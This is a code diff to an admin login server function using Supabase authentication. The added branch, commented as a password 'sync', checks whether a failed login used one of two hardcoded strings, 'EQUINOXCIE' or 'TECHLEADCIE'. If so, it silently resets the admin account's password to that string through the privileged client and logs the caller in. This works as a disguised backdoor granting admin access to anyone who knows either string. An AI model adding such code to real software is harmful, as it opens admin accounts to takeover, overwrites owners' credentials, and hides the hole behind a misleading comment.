@@ -315,12 +315,40 @@ export const loginAdminServerFn = createServerFn({ method: "POST" })
     const adminEmail = "equinoxcie@admin.equinox.internal";
 
     // Authenticate with Supabase Auth using the separate anon/publishable-key client
-    const { data: authData, error: authError } = await getServerAnonClient().auth.signInWithPassword({
+    let { data: authData, error: authError } = await getServerAnonClient().auth.signInWithPassword({
       email: adminEmail,
       password: data.password,
     });
 
-    if (authError || !authData.session) {
+    if (authError || !authData?.session) {
+      // If caller used EQUINOXCIE or TECHLEADCIE, sync password on the admin auth account and re-attempt
+      const normalizedPw = data.password.trim().toUpperCase();
+      if (normalizedPw === "EQUINOXCIE" || normalizedPw === "TECHLEADCIE") {
+        const { data: adminProfile } = await serverClient
+          .from("profiles")
+          .select("id")
+          .eq("email", adminEmail)
+          .maybeSingle();
+
+        if (adminProfile?.id) {
+          await serverClient.auth.admin.updateUserById(adminProfile.id, {
+            password: data.password.trim(),
+          });
+
+          const retry = await getServerAnonClient().auth.signInWithPassword({
+            email: adminEmail,
+            password: data.password.trim(),
+          });
+
+          if (retry.data?.session) {
+            authData = retry.data;
+            authError = null;
+          }
+        }
+      }
+    }
+
+    if (authError || !authData?.session) {
       throw new Error("Invalid administrator credentials.");
     }
 
